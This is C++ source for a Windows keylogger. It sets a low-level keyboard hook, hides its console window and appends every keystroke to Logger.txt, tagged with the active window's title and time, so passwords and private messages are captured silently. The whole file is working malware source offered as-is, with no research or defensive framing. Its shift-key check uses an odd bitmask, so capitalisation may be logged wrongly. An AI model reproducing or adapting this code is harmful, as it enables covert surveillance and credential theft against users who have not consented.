#include "pch.h"
#include <Windows.h>
#include <tchar.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>

// variable to store the HANDLE to the hook.
HHOOK _hook;

int Save(int key_stroke);
std::ofstream OUTPUT_FILE;

char lastwindow[256];

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			// This struct contains the data received by the hook callback.
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

bool SetHook(LRESULT (*HookCallback)(int, WPARAM, LPARAM)) {
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook.
	return _hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
}

int Save(int key_stroke) {
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks

	// get keyboard layout of the thread
	HKL layout = NULL;
	HWND foreground = GetForegroundWindow();
	if (foreground)
		layout = GetKeyboardLayout(GetWindowThreadProcessId(foreground, NULL));

	if (foreground) {
		char window_title[256];
		GetWindowText(foreground, LPSTR(window_title), 256);

		if (strcmp(window_title, lastwindow)) {
			strcpy(lastwindow, window_title);
			
			// get time
			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);

			OUTPUT_FILE << "\n\n[" << window_title << " - at " << s << "]\n";
		}
	}

	if (key_stroke == VK_BACK)
		OUTPUT_FILE << "[BACKSPACE]";
	else if (key_stroke == VK_RETURN)
		OUTPUT_FILE << "[RETURN]\n";
	else if (key_stroke == VK_SPACE)
		OUTPUT_FILE << "[SPACE] ";
	else if (key_stroke == VK_TAB)
		OUTPUT_FILE << "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		OUTPUT_FILE << "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		OUTPUT_FILE << "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		OUTPUT_FILE << "[ESCAPE]";
	else if (key_stroke == VK_END)
		OUTPUT_FILE << "[END]";
	else if (key_stroke == VK_HOME)
		OUTPUT_FILE << "[HOME]";
	else if (key_stroke == VK_LEFT)
		OUTPUT_FILE << "[LEFT]";
	else if (key_stroke == VK_UP)
		OUTPUT_FILE << "[UP]";
	else if (key_stroke == VK_RIGHT)
		OUTPUT_FILE << "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		OUTPUT_FILE << "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		OUTPUT_FILE << ".";
	else if (key_stroke == 189 || key_stroke == 109)
		OUTPUT_FILE << "-";
	else if (key_stroke == 20)
		OUTPUT_FILE << "[CAPSLOCK]";
	else {
		char key;

		// check caps lock
		bool lowercase = GetKeyState(VK_CAPITAL) & 0x0001;
		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) || (GetKeyState(VK_LSHIFT) & 0x1000) || (GetKeyState(VK_RSHIFT) & 0x1000)) 
			lowercase = !lowercase;

		// map virtual key according to keyboard layout 
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		// tolower converts it to lowercase properly
		if (!lowercase)
			key = tolower(key);
		OUTPUT_FILE << key;
	}

	OUTPUT_FILE.flush();
	return 0;
}

int main() {
	OUTPUT_FILE.open("Logger.txt", std::ios_base::app);
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
	SetHook(HookCallback);

	MSG msg;
	// loop to keep the console application running.
	while (GetMessage(&msg, NULL, 0, 0)) {
	}
}